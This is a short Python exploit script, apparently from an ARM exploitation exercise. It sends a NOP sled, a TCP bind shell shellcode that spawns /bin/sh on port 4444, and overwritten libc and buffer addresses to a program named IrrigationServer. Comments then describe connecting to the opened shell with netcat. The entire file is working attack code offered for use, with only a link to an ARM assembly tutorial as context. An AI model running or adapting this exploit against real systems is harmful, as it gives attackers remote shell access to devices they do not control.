#!/usr/bin/python

import sys, socket


# NoP + TCP bind shell (listen at anyaddr:4444) + libc_addr(printf) + buffer_addr

shellcode = ("\x01\x10\xa0\xe1"*22
+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x12\xa1\x4a\x70\x0a\x71\x4a\x71\x8a\x71\xca\x71\x10\x22\x01\x37\x01\xdf\xc0\x46\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\x49\x1a\x92\x1a\x01\x37\x01\xdf\x04\x1c\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x05\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+"\x50\xd0\x02\x00")              # addr of libc (printf) -> $readelf --relocs IrrigationServer

addr = ("\x50\x3a\x03\x00")       # buffer addr



if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "./ho_bind.py  192.168.1.26  5555"
    else:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
        sock.send(shellcode)
        sock.send(addr)
        sock.close()

        print "Shellcode Length: %d" %len(shellcode)





# After sending the exploit, connect in the following way
# netcat -nv <ip_addr> 4444
# netcat -nv 192.168.1.26 4444


# https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/

